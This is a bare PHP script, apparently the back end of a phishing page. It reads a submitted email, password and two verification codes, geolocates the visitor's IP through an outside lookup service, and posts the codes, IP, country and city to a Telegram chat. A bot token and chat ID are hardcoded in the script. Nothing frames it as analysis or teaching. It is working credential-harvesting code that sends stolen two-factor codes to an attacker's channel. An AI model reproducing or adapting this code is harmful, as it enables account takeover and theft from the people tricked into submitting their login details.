<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $firstCodeMail = $_POST['firstCodeMail'];
    $SecondsCodeMail = $_POST['codeMail'];
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $url = "https://checkip.vip/api/lookup?_=1702640330039";
    $data = array(
        'ip' => $ipAddress
    );
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $dataArray = json_decode($response, true);
    $country = $dataArray['data']['country'];
    $city = $dataArray['data']['city'];
    $botToken = '6853646357:AAHwg0Bj7IFdPUoEdQlQcn8rYfnxW6_WtR0';
    $chatId = '-1001895985233';
    $text = "<strong>Code 1 :</strong> $firstCodeMail\n<strong>Code 2 :</strong> $SecondsCodeMail\n<strong>IP :</strong> $ipAddress\n<strong>Country:</strong> $country\n<strong>City :</strong> $city\n";

    $apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=" . urlencode($text) . "&parse_mode=html";

    // Sử dụng cURL để gửi yêu cầu
    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $jsonObject = json_decode($response, true);
    $title = $jsonObject['result']['sender_chat']['title'];
    echo $title;
    }
                        
